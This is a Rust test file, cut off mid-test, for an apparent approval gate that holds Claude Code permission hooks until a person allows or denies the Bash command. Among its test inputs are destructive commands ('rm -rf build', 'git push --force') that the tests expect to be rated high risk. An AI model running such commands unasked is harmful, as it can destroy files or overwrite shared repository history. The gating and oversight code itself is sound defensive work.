//! The interactions on a real actor with the adapter of Claude Code: a hook that a shim holds
//! opens an approval, a client answers it, and the decision goes back to the shim.

use std::time::{Duration, Instant};

use nh_proto::api::{
    common::Harness,
    ids::{InteractionId, RunId},
    projections::Projection,
};
use semver::Version;
use serde_json::{Value, json};
use tokio::sync::mpsc::UnboundedReceiver;

use super::gate::{GateOutcome, GateStart};
use crate::ErrorCode;
use crate::agents::{
    AdapterHosts, runs,
    tests::{Fixture, execution, hook},
};

const SHIM: u64 = 7;

/// A fixture with a Claude run that the hook of a session bound, in the range of a version that
/// the recordings cover.
pub(crate) async fn started() -> (Fixture, RunId) {
    started_with(Fixture::new()).await
}

pub(crate) async fn started_with(f: Fixture) -> (Fixture, RunId) {
    f.hook(
        Harness::Claude,
        "SessionStart",
        hook("s1", json!({"source": "startup"})),
    )
    .await;
    let run = loop {
        f.hub.flush();
        if let Some(key) = f.hub.snapshot(Projection::Agents).items.keys().next() {
            break key.parse::<RunId>().expect("a run id");
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    };
    f.eventually(run, |item| execution(item) == "idle").await;
    f.update(move |parts| runs::set_version(parts, run, Ok(Version::new(2, 1, 292))))
        .await;
    (f, run)
}

/// The tool call that comes before a request for permission.
pub(crate) async fn pre_tool(f: &Fixture, call: &str, command: &str) {
    f.hook(
        Harness::Claude,
        "PreToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": call, "tool_input": {"command": command}}),
        ),
    )
    .await;
}

fn request(command: &str) -> Value {
    hook(
        "s1",
        json!({
            "permission_mode": "default",
            "tool_name": "Bash",
            "tool_input": {"command": command},
            "permission_suggestions": [],
        }),
    )
}

pub(crate) async fn gate(
    f: &Fixture,
    conn: u64,
    command: &str,
) -> (GateStart, Option<UnboundedReceiver<GateOutcome>>) {
    let mut start = f
        .gates
        .open(
            f.pane.ulid(),
            Harness::Claude,
            "PermissionRequest".to_owned(),
            request(command),
            conn,
            None,
        )
        .await
        .expect("the gate opens");
    let rx = start.rx.take();
    (start, rx)
}

pub(crate) fn id_of(start: &GateStart) -> InteractionId {
    start.result["interaction"]
        .as_str()
        .expect("an interaction")
        .parse()
        .expect("an id")
}

pub(crate) async fn answer(
    f: &Fixture,
    id: InteractionId,
    decision: Value,
) -> Result<Value, crate::error::RpcError> {
    let call = nh_proto::api::methods::Call::parse(
        "interaction.answer",
        json!({"interaction": id.to_string(), "decision": decision, "via": "card"}),
    )
    .expect("a call");
    f.thread
        .handle()
        .call(call, crate::actor::Origin::ui())
        .await
}

pub(crate) async fn call(
    f: &Fixture,
    method: &str,
    params: Value,
) -> Result<Value, crate::error::RpcError> {
    let call = nh_proto::api::methods::Call::parse(method, params).expect("a call");
    f.thread
        .handle()
        .call(call, crate::actor::Origin::ui())
        .await
}

pub(crate) fn allow() -> Value {
    json!({"kind": "approval", "behavior": "allow"})
}

pub(crate) fn deny(message: &str) -> Value {
    json!({"kind": "approval", "behavior": "deny", "message": message})
}

/// The interaction as the projection shows it.
fn row(f: &Fixture, id: InteractionId) -> Value {
    f.item(Projection::Interactions, &id.to_string())
        .expect("a row in interactions")
}

async fn eventually_row(f: &Fixture, id: InteractionId, want: impl Fn(&Value) -> bool) -> Value {
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        if let Some(row) = f
            .item(Projection::Interactions, &id.to_string())
            .filter(|r| want(r))
        {
            return row;
        }
        assert!(Instant::now() < deadline, "the interaction never got there");
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
}

async fn recv(rx: &mut UnboundedReceiver<GateOutcome>) -> GateOutcome {
    tokio::time::timeout(Duration::from_secs(10), rx.recv())
        .await
        .expect("the shim hears in time")
        .expect("the channel is open")
}

fn kinds_of(f: &mut Fixture) -> Vec<String> {
    f.kinds()
        .into_iter()
        .filter(|kind| kind.starts_with("interaction."))
        .collect()
}

#[tokio::test]
async fn a_request_for_permission_opens_an_approval_that_the_shim_waits_for() {
    let (mut f, run) = started().await;
    pre_tool(&f, "toolu_1", "pnpm test").await;
    let (start, _rx) = gate(&f, SHIM, "pnpm test").await;
    assert_eq!(start.result["wait"], true);
    let id = id_of(&start);
    let shown = row(&f, id);
    assert_eq!(shown["kind"], "approval");
    assert_eq!(shown["state"], "open");
    assert_eq!(shown["mode"], "gate");
    assert_eq!(shown["answerable"], true);
    assert_eq!(shown["handle"], "i1");
    assert_eq!(shown["channels"], json!(["native"]));
    assert_eq!(shown["payload"]["kind"], "approval");
    assert_eq!(shown["payload"]["tool"], "Bash");
    assert_eq!(shown["payload"]["command"]["argv"], json!(["pnpm", "test"]));
    assert_eq!(shown["title"], "Run `pnpm test`");
    assert!(shown["deadline"].is_string(), "a held hook has a deadline");
    assert_eq!(shown["run"], run.to_string());
    // The run needs the user (`attention`), and the arbiter lists the interaction as pending.
    let attention = f
        .item(Projection::Attention, &run.to_string())
        .expect("a row in attention");
    assert_eq!(attention["reasons"], json!(["approval"]));
    assert_eq!(attention["interactions"], json!([id.to_string()]));
    let agent = f.item(Projection::Agents, &run.to_string()).expect("a run");
    assert_eq!(agent["facets"]["pending"], json!([id.to_string()]));
    assert!(kinds_of(&mut f).contains(&"interaction.opened".to_owned()));
}

#[tokio::test]
async fn an_answer_goes_to_the_shim_and_the_end_of_the_tool_delivers_it() {
    let (mut f, run) = started().await;
    pre_tool(&f, "toolu_1", "touch note.txt").await;
    let (start, rx) = gate(&f, SHIM, "touch note.txt").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    kinds_of(&mut f);
    let answered = answer(&f, id, allow()).await.expect("recorded");
    assert_eq!(answered["rev"], 1);
    let GateOutcome::Decision {
        interaction,
        output,
        key,
    } = recv(&mut rx).await
    else {
        panic!("a decision");
    };
    assert_eq!(interaction, id);
    let output: Value = serde_json::from_str(&output).expect("JSON");
    assert_eq!(
        output,
        json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": {"behavior": "allow"}}})
    );
    let shown = eventually_row(&f, id, |r| r["state"] == "delivering").await;
    assert_eq!(shown["delivery"]["rev"], 1);
    assert_eq!(shown["delivery"]["decided_by"], "ui");
    assert_eq!(shown["delivery"]["via"], "card");
    // The shim prints the decision and says so.
    f.gates
        .ack(id, f.pane.ulid(), key, true)
        .await
        .expect("an ack");
    // The tool ran: the harness resolved the request, and the delivery is confirmed.
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "touch note.txt"}, "tool_response": {}}),
        ),
    )
    .await;
    eventually_row(&f, id, |r| r["state"] == "delivered").await;
    assert_eq!(
        kinds_of(&mut f),
        [
            "interaction.decided",
            "interaction.delivery_started",
            "interaction.delivered"
        ]
    );
    // The run needs nothing now.
    f.hub.flush();
    assert!(f.item(Projection::Attention, &run.to_string()).is_none());
    // The row is in the database with its delivery record.
    let stored = f
        .thread
        .handle()
        .store(move |store| store.interaction_row(id.ulid()))
        .await
        .expect("a read")
        .expect("a row");
    assert_eq!(stored.0.state, "delivered");
    assert_eq!(stored.1.expect("a record").rev, 1);
}

#[tokio::test]
async fn a_delivered_answer_counts_as_a_good_observation_of_the_version() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "touch note.txt").await;
    let (start, rx) = gate(&f, SHIM, "touch note.txt").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(&f, id, allow()).await.expect("recorded");
    let GateOutcome::Decision { key, .. } = recv(&mut rx).await else {
        panic!("a decision");
    };
    f.gates
        .ack(id, f.pane.ulid(), key, true)
        .await
        .expect("an ack");
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "touch note.txt"}, "tool_response": {}}),
        ),
    )
    .await;
    eventually_row(&f, id, |r| r["state"] == "delivered").await;
    let rows = f
        .update(|parts| parts.commit(|tx| tx.drift_rows()).expect("rows"))
        .await;
    assert_eq!(rows.len(), 1);
    assert_eq!(
        (
            rows[0].harness.as_str(),
            rows[0].version.as_str(),
            rows[0].observations,
            rows[0].bad_signals
        ),
        ("claude", "2.1.292", 1, 0)
    );
}

#[tokio::test]
async fn a_deny_carries_its_message_and_can_stop_the_turn() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "rm -rf build").await;
    let (start, rx) = gate(&f, SHIM, "rm -rf build").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    assert_eq!(row(&f, id)["risk"], "high");
    answer(
        &f,
        id,
        json!({"kind": "approval", "behavior": "deny", "message": "not that", "stop": true}),
    )
    .await
    .expect("recorded");
    let GateOutcome::Decision { output, .. } = recv(&mut rx).await else {
        panic!("a decision");
    };
    let output: Value = serde_json::from_str(&output).expect("JSON");
    assert_eq!(
        output["hookSpecificOutput"]["decision"],
        json!({"behavior": "deny", "message": "not that", "interrupt": true})
    );
}

#[tokio::test]
async fn a_second_answer_is_refused_with_who_decided() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(&f, id, allow()).await.expect("first");
    recv(&mut rx).await;
    eventually_row(&f, id, |r| r["state"] == "delivering").await;
    let error = answer(&f, id, deny("late")).await.expect_err("refused");
    assert_eq!(error.code, ErrorCode::AlreadyAnswered);
    assert_eq!(error.details["by"], "ui");
    assert_eq!(error.details["via"], "card");
    assert_eq!(error.details["decision"]["behavior"], "allow");
    // A decision of the wrong kind is a mistake of the caller.
    let wrong = answer(
        &f,
        id,
        json!({"kind": "plan_review", "approve": false, "feedback": "x"}),
    )
    .await
    .expect_err("refused");
    assert!(
        wrong.code == ErrorCode::InvalidParams || wrong.code == ErrorCode::AlreadyAnswered,
        "{wrong:?}"
    );
}

#[tokio::test]
async fn a_decision_of_the_wrong_kind_is_invalid() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    let id = id_of(&start);
    let error = answer(
        &f,
        id,
        json!({"kind": "question", "answers": [{"question": "x", "selected": ["a"]}]}),
    )
    .await
    .expect_err("refused");
    assert_eq!(error.code, ErrorCode::InvalidParams);
    let error = answer(
        &f,
        id,
        json!({"kind": "approval", "behavior": "deny", "always": true}),
    )
    .await
    .expect_err("refused");
    assert_eq!(error.code, ErrorCode::InvalidParams);
    assert_eq!(row(&f, id)["state"], "open", "nothing changed");
}

#[tokio::test]
async fn an_answer_in_the_dialog_of_the_harness_ends_the_interaction_as_resolved_elsewhere() {
    let (mut f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    kinds_of(&mut f);
    // The user answers in the TUI while the hook waits: the tool runs.
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "ls"}, "tool_response": {}}),
        ),
    )
    .await;
    eventually_row(&f, id, |r| r["state"] == "resolved_elsewhere").await;
    assert_eq!(kinds_of(&mut f), ["interaction.resolved_elsewhere"]);
    // The shim lets go of the hook: it prints nothing.
    assert_eq!(
        recv(&mut rx).await,
        GateOutcome::NoDecision {
            interaction: id,
            reason: "resolved_elsewhere"
        }
    );
    // A late answer is refused.
    let error = answer(&f, id, allow()).await.expect_err("refused");
    assert_eq!(error.code, ErrorCode::InteractionClosed);
}

#[tokio::test]
async fn a_dismissal_lets_the_hook_go() {
    let (mut f, run) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    kinds_of(&mut f);
    call(
        &f,
        "interaction.dismiss",
        json!({"interaction": id.to_string()}),
    )
    .await
    .expect("dismissed");
    assert_eq!(
        recv(&mut rx).await,
        GateOutcome::NoDecision {
            interaction: id,
            reason: "dismissed"
        }
    );
    eventually_row(&f, id, |r| r["state"] == "dismissed").await;
    assert_eq!(kinds_of(&mut f), ["interaction.dismissed"]);
    // The arbiter closed it, and the run needs nothing.
    let agent = f.item(Projection::Agents, &run.to_string()).expect("a run");
    let deadline = Instant::now() + Duration::from_secs(10);
    loop {
        let agent = f.item(Projection::Agents, &run.to_string()).expect("a run");
        if agent["facets"]["pending"] == json!([]) {
            break;
        }
        assert!(Instant::now() < deadline, "pending never emptied: {agent}");
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    let _ = agent;
    assert!(f.item(Projection::Attention, &run.to_string()).is_none());
    let error = call(
        &f,
        "interaction.dismiss",
        json!({"interaction": id.to_string()}),
    )
    .await
    .expect_err("closed");
    assert_eq!(error.code, ErrorCode::InteractionClosed);
}

#[tokio::test]
async fn the_deadline_fails_the_interaction_and_lets_the_hook_go() {
    let hosts = AdapterHosts::new(tokio::runtime::Handle::current());
    let (mut f, _) = started_with(Fixture::with_gate_timeout(
        hosts,
        Some(Duration::from_millis(300)),
    ))
    .await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    kinds_of(&mut f);
    assert_eq!(
        recv(&mut rx).await,
        GateOutcome::NoDecision {
            interaction: id,
            reason: "deadline"
        }
    );
    let shown = eventually_row(&f, id, |r| r["state"] == "failed").await;
    assert_eq!(shown["delivery"]["fail_reason"], "deadline");
    assert_eq!(kinds_of(&mut f), ["interaction.delivery_failed"]);
    let error = answer(&f, id, allow()).await.expect_err("late");
    assert_eq!(error.code, ErrorCode::InteractionClosed);
}

#[tokio::test]
async fn a_shim_that_loses_its_connection_before_the_ack_resumes_with_the_same_decision() {
    let (mut f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(&f, id, allow()).await.expect("recorded");
    let GateOutcome::Decision { key, output, .. } = recv(&mut rx).await else {
        panic!("a decision");
    };
    eventually_row(&f, id, |r| r["state"] == "delivering").await;
    kinds_of(&mut f);
    // The connection drops before the shim acknowledges.
    f.gates.connection_closed(SHIM);
    eventually_row(&f, id, |r| r["state"] == "delivery_unknown").await;
    assert_eq!(kinds_of(&mut f), ["interaction.delivery_unknown"]);
    // The token of another pane cannot take the hook, nor acknowledge the delivery: for it, the
    // interaction does not exist.
    let other = ulid::Ulid::from(0xdead_u128);
    let refused = f
        .gates
        .resume(id, other, 9, None)
        .await
        .err()
        .expect("another pane");
    assert_eq!(refused.code, ErrorCode::NotFound);
    let refused = f
        .gates
        .ack(id, other, key.clone(), true)
        .await
        .expect_err("another pane");
    assert_eq!(refused.code, ErrorCode::NotFound);
    assert_eq!(row(&f, id)["state"], "delivery_unknown");
    // The shim connects again and resumes. It gets the same decision with the same key.
    let mut resumed = f
        .gates
        .resume(id, f.pane.ulid(), 8, None)
        .await
        .expect("resumed");
    assert_eq!(resumed.result["wait"], true);
    let mut rx2 = resumed.rx.take().expect("a new channel");
    let GateOutcome::Decision {
        key: again,
        output: same,
        ..
    } = recv(&mut rx2).await
    else {
        panic!("a decision");
    };
    assert_eq!(again, key);
    assert_eq!(same, output);
    eventually_row(&f, id, |r| r["state"] == "delivering").await;
    f.gates
        .ack(id, f.pane.ulid(), again, true)
        .await
        .expect("an ack");
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "ls"}, "tool_response": {}}),
        ),
    )
    .await;
    eventually_row(&f, id, |r| r["state"] == "delivered").await;
}

#[tokio::test]
async fn the_end_of_the_process_cancels_the_open_interactions() {
    let (mut f, run) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    kinds_of(&mut f);
    f.update(move |parts| runs::end(parts, run, nh_proto::api::common::Source::Holder, Some(0)))
        .await;
    eventually_row(&f, id, |r| r["state"] == "cancelled").await;
    assert_eq!(kinds_of(&mut f), ["interaction.cancelled"]);
    assert_eq!(
        recv(&mut rx).await,
        GateOutcome::NoDecision {
            interaction: id,
            reason: "cancelled"
        }
    );
}

#[tokio::test]
async fn the_end_of_the_turn_cancels_the_open_interactions() {
    let (mut f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    let id = id_of(&start);
    kinds_of(&mut f);
    f.hook(Harness::Claude, "Stop", hook("s1", json!({}))).await;
    eventually_row(&f, id, |r| r["state"] == "cancelled").await;
    assert_eq!(kinds_of(&mut f), ["interaction.cancelled"]);
}

#[tokio::test]
async fn a_repeated_request_is_the_same_interaction() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (first, _rx) = gate(&f, SHIM, "ls").await;
    // The same call again, on another connection: the shim of a hook that retried.
    pre_tool(&f, "toolu_1", "ls").await;
    let (second, _rx2) = gate(&f, 9, "ls").await;
    let id = id_of(&first);
    if second.result["wait"] == true {
        assert_eq!(id_of(&second), id, "one interaction for one request");
    }
    f.hub.flush();
    assert_eq!(f.hub.snapshot(Projection::Interactions).items.len(), 1);
}

#[tokio::test]
async fn an_event_that_opens_nothing_gets_no_decision_at_once() {
    let (f, _) = started().await;
    let start = f
        .gates
        .open(
            f.pane.ulid(),
            Harness::Claude,
            "PermissionRequest".to_owned(),
            hook("s1", json!({})),
            SHIM,
            None,
        )
        .await
        .expect("a reply");
    assert_eq!(start.result["no_decision"], true);
    assert!(start.rx.is_none());
}

#[tokio::test]
async fn next_list_and_show_read_the_table() {
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    let id = id_of(&start);
    let next = call(&f, "interaction.next", json!({})).await.expect("next");
    assert_eq!(next["interaction"], id.to_string());
    assert_eq!(next["handle"], "i1");
    let listed = call(&f, "interaction.list", json!({})).await.expect("list");
    assert_eq!(listed["interactions"].as_array().map(Vec::len), Some(1));
    let shown = call(&f, "interaction.show", json!({"interaction": "i1"}))
        .await
        .expect("show");
    assert_eq!(shown["interaction"]["id"], id.to_string());
    let missing = call(&f, "interaction.show", json!({"interaction": "i99"}))
        .await
        .expect_err("not found");
    assert_eq!(missing.code, ErrorCode::NotFound);
    answer(&f, id, allow()).await.expect("recorded");
    // An interaction with a decision is not the next one to answer.
    let none = call(&f, "interaction.next", json!({})).await.expect("next");
    assert!(none["interaction"].is_null());
    let open = call(&f, "interaction.list", json!({"open_only": false}))
        .await
        .expect("list");
    assert_eq!(open["interactions"].as_array().map(Vec::len), Some(1));
}

#[tokio::test]
async fn a_risky_command_makes_the_run_urgent() {
    let (f, run) = started().await;
    pre_tool(&f, "toolu_1", "git push --force").await;
    let (start, _rx) = gate(&f, SHIM, "git push --force").await;
    let id = id_of(&start);
    let shown = row(&f, id);
    assert_eq!(shown["risk"], "high");
    let attention = f
        .item(Projection::Attention, &run.to_string())
        .expect("a row in attention");
    assert_eq!(attention["urgency"], "high");
}

#[tokio::test]
async fn an_interaction_of_a_run_that_is_only_suggested_cannot_be_answered() {
    let f = Fixture::new();
    // A run that the process walk found, and no hook has bound to its pane.
    let pane = f.pane;
    let run = f
        .update(move |parts| {
            runs::start(
                parts,
                pane,
                &nh_agents::matcher::Detection {
                    manifest: "claude".to_owned(),
                    harness: Harness::Claude,
                    priority: 100,
                    remote_loop: None,
                    pid: 4242,
                    start: 1_760_000_000_000,
                    place: 0,
                },
                false,
            )
            .expect("a run")
        })
        .await;
    f.update(move |parts| runs::set_version(parts, run, Ok(Version::new(2, 1, 292))))
        .await;
    // The adapter reads a request, but the hook did not come with the token of the pane.
    let hosts = std::sync::Arc::clone(&f.hosts);
    f.update(move |parts| {
        let start = runs::adapter_start(parts, run).expect("a start");
        hosts.deliver(
            start,
            nh_agents::adapter::AdapterSignal::Raw {
                harness_event: "PermissionRequest".to_owned(),
                payload: request("ls"),
            },
            nh_proto::api::time::Timestamp(crate::persist::now_ms()),
        );
    })
    .await;
    let deadline = Instant::now() + Duration::from_secs(10);
    let id = loop {
        f.hub.flush();
        if let Some(key) = f.hub.snapshot(Projection::Interactions).items.keys().next() {
            break key.parse::<InteractionId>().expect("an id");
        }
        assert!(Instant::now() < deadline, "no interaction opened");
        tokio::time::sleep(Duration::from_millis(10)).await;
    };
    let shown = row(&f, id);
    assert_eq!(shown["answerable"], false);
    assert_eq!(shown["mode"], "observe");
    assert_eq!(shown["channels"], json!([]));
    let error = answer(&f, id, allow()).await.expect_err("refused");
    assert_eq!(error.code, ErrorCode::NotAnswerable);
    // It does not count for `attention`, and `interaction.next` skips it.
    assert!(f.item(Projection::Attention, &run.to_string()).is_none());
    let next = call(&f, "interaction.next", json!({})).await.expect("next");
    assert!(next["interaction"].is_null());
}

#[tokio::test]
async fn the_end_of_the_tool_settles_an_interaction_that_an_adapter_never_saw() {
    // A core that started again has a new adapter. The adapter did not open the interaction, so it
    // cannot say that the tool call resolved it, and the core reads the end of the call.
    let (f, run) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    answer(&f, id, allow()).await.expect("recorded");
    let GateOutcome::Decision { key, .. } = recv(&mut rx).await else {
        panic!("a decision");
    };
    f.gates
        .ack(id, f.pane.ulid(), key, true)
        .await
        .expect("an ack");
    // A new adapter: the old one is stopped, and the host starts another with the next signal.
    f.hosts.stop(run, nh_agents::adapter::StopReason::Shutdown);
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "ls"}, "tool_response": {}}),
        ),
    )
    .await;
    eventually_row(&f, id, |r| r["state"] == "delivered").await;
}

// --- the modes of the gate and the focus ---------------------------------------------

use crate::{agents::tests::Options, layout::model::WindowFacts};

/// How long a change of the focus stands in these tests.
const DEBOUNCE: Duration = Duration::from_millis(150);

async fn started_in_mode(config: &'static str) -> (Fixture, RunId) {
    started_with(Fixture::with_options(Options {
        config: Some(config),
        focus_debounce: Some(DEBOUNCE),
        ..Options::default()
    }))
    .await
}

/// The window looks at the pane, or at the chrome, or the app is in the background.
pub(crate) async fn report_focus(
    f: &Fixture,
    window: nh_proto::api::ids::WindowId,
    facts: WindowFacts,
) {
    f.thread
        .handle()
        .update(move |parts| crate::actor::layout::apply_window_report(parts, window, facts))
        .await
        .expect("the actor answers");
}

pub(crate) fn looking_at(pane: nh_proto::api::ids::PaneId) -> WindowFacts {
    WindowFacts {
        focused: true,
        visible: true,
        active_pane: Some(pane),
        ..WindowFacts::default()
    }
}

/// Opens a window, looks at the pane, and waits until the focus has settled.
pub(crate) async fn focus_the_pane(f: &Fixture) -> nh_proto::api::ids::WindowId {
    let window = f.open_window().await;
    report_focus(f, window, looking_at(f.pane)).await;
    let pane = f.pane;
    for _ in 0..200 {
        if f.update(move |parts| parts.state.focus.is_focused(pane))
            .await
        {
            return window;
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    panic!("the pane never got the focus");
}

#[tokio::test]
async fn a_pane_that_has_the_focus_does_not_hold_the_hook() {
    let (f, run) = started_in_mode("").await;
    focus_the_pane(&f).await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    assert_eq!(start.result["no_decision"], true);
    assert_eq!(start.result["reason"], "observe");
    assert!(rx.is_none(), "the shim has nothing to wait for");
    // The interaction is open in the mode `observe`: the harness shows its dialog.
    let id = loop {
        f.hub.flush();
        if let Some(key) = f.hub.snapshot(Projection::Interactions).items.keys().next() {
            break key.parse::<InteractionId>().expect("an id");
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    };
    let shown = row(&f, id);
    assert_eq!(shown["mode"], "observe");
    assert_eq!(shown["state"], "open");
    // Keys can answer the dialog of the harness.
    assert_eq!(shown["answerable"], true);
    assert_eq!(shown["channels"], json!(["keystroke"]));
    assert!(shown["deadline"].is_null());
    // The fixture has no pane to type in, so the answer is recorded and the delivery fails.
    answer(&f, id, allow()).await.expect("recorded");
    let failed = eventually_row(&f, id, |r| r["state"] == "failed").await;
    assert_eq!(failed["delivery"]["fail_reason"], "keystrokes_unavailable");
    let _ = run;
}

#[tokio::test]
async fn the_server_sets_the_surface_of_an_answer() {
    // A client of the CLI says that a rule of the policy decided. The record says `cli`.
    let (f, _) = started().await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    let id = id_of(&start);
    let call = nh_proto::api::methods::Call::parse(
        "interaction.answer",
        json!({"interaction": id.to_string(), "decision": allow(), "via": "policy"}),
    )
    .expect("a call");
    f.thread
        .handle()
        .call(call, crate::actor::Origin::cli(3))
        .await
        .expect("recorded");
    let shown = row(&f, id);
    assert_eq!(shown["delivery"]["via"], "cli");
    assert_eq!(shown["delivery"]["decided_by"], "cli:3");
    // The UI says which of its surfaces it was, and it cannot be a rule either.
    pre_tool(&f, "toolu_2", "pwd").await;
    let (start, _rx2) = gate(&f, SHIM + 1, "pwd").await;
    let second = id_of(&start);
    let call = nh_proto::api::methods::Call::parse(
        "interaction.answer",
        json!({"interaction": second.to_string(), "decision": allow(), "via": "policy"}),
    )
    .expect("a call");
    f.thread
        .handle()
        .call(call, crate::actor::Origin::ui())
        .await
        .expect("recorded");
    assert_eq!(row(&f, second)["delivery"]["via"], "card");
}

#[tokio::test]
async fn keys_do_not_answer_while_the_run_has_two_open_approvals() {
    // The person allowed `ls` in the dialog of the harness. Its tool runs, the dialog of `pwd`
    // comes, and the card of `ls` stays open until the tool ends. An Allow on the card of `ls`
    // must not answer the dialog of `pwd`.
    let (f, _run) = started_in_mode("").await;
    focus_the_pane(&f).await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (first, _) = gate(&f, SHIM, "ls").await;
    assert_eq!(first.result["reason"], "observe");
    pre_tool(&f, "toolu_2", "pwd").await;
    let (second, _) = gate(&f, SHIM + 1, "pwd").await;
    assert_eq!(second.result["reason"], "observe");
    let stale = f
        .update(|parts| {
            let open = parts.state.interactions.open();
            assert_eq!(open.len(), 2, "two open approvals");
            open.iter()
                .find(|i| i.native_ref.as_deref() == Some("toolu_1"))
                .map(|i| i.id)
        })
        .await
        .expect("the approval of ls");
    answer(&f, stale, allow()).await.expect("recorded");
    let failed = eventually_row(&f, stale, |r| r["state"] == "failed").await;
    assert_eq!(failed["delivery"]["fail_reason"], "several_requests_open");
}

#[tokio::test]
async fn a_pane_without_the_focus_holds_the_hook() {
    let (f, _run) = started_in_mode("").await;
    let window = f.open_window().await;
    // The app is in the background: the window is not focused.
    let mut away = looking_at(f.pane);
    away.focused = false;
    report_focus(&f, window, away).await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    assert_eq!(start.result["wait"], true);
    assert!(rx.is_some());
}

#[tokio::test]
async fn the_mode_observe_never_holds_the_hook() {
    let (f, _run) = started_in_mode("[approvals]\nmode = \"observe\"\n").await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    assert_eq!(start.result["no_decision"], true);
    assert_eq!(start.result["reason"], "observe");
}

#[tokio::test]
async fn the_mode_gate_holds_the_hook_of_a_pane_that_has_the_focus() {
    let (f, _run) = started_in_mode("[approvals]\nmode = \"gate\"\n").await;
    focus_the_pane(&f).await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, rx) = gate(&f, SHIM, "ls").await;
    assert_eq!(start.result["wait"], true);
    assert!(rx.is_some());
}

#[tokio::test]
async fn the_mode_of_a_harness_beats_the_global_mode() {
    // Claude Code observes. The global mode is `gate`, and Codex has its own mode.
    let (f, _run) = started_in_mode(
        "[approvals]\nmode = \"gate\"\n\n[approvals.claude]\nmode = \"observe\"\n\n[approvals.codex]\nmode = \"gate\"\n",
    )
    .await;
    pre_tool(&f, "toolu_1", "ls").await;
    let (start, _rx) = gate(&f, SHIM, "ls").await;
    assert_eq!(start.result["no_decision"], true);
}

#[tokio::test]
async fn a_held_hook_is_released_when_the_pane_gets_the_focus() {
    let (f, run) = started_in_mode("").await;
    pre_tool(&f, "toolu_1", "pnpm test").await;
    let (start, rx) = gate(&f, SHIM, "pnpm test").await;
    let mut rx = rx.expect("the shim listens");
    let id = id_of(&start);
    assert_eq!(row(&f, id)["mode"], "gate");
    // The user looks at the pane. Nothing happens before the debounce is over.
    let window = f.open_window().await;
    report_focus(&f, window, looking_at(f.pane)).await;
    assert!(
        rx.try_recv().is_err(),
        "a change of the focus needs the debounce"
    );
    assert_eq!(
        recv(&mut rx).await,
        GateOutcome::NoDecision {
            interaction: id,
            reason: "focused"
        }
    );
    // The interaction goes on in the mode `observe`: the dialog of the harness is the way to answer.
    let shown = eventually_row(&f, id, |r| r["mode"] == "observe").await;
    assert_eq!(shown["state"], "open");
    // The hook is gone, and the dialog of the harness is on the screen: keys can answer it.
    assert_eq!(shown["answerable"], true);
    assert_eq!(shown["channels"], json!(["keystroke"]));
    assert!(shown["deadline"].is_null());
    // The user answers in the dialog. The tool runs, and the interaction ends elsewhere.
    f.hook(
        Harness::Claude,
        "PostToolUse",
        hook(
            "s1",
            json!({"tool_name": "Bash", "tool_use_id": "toolu_1", "tool_input": {"command": "pnpm test"}, "tool_response": {}}),
        ),
    )
    .await;
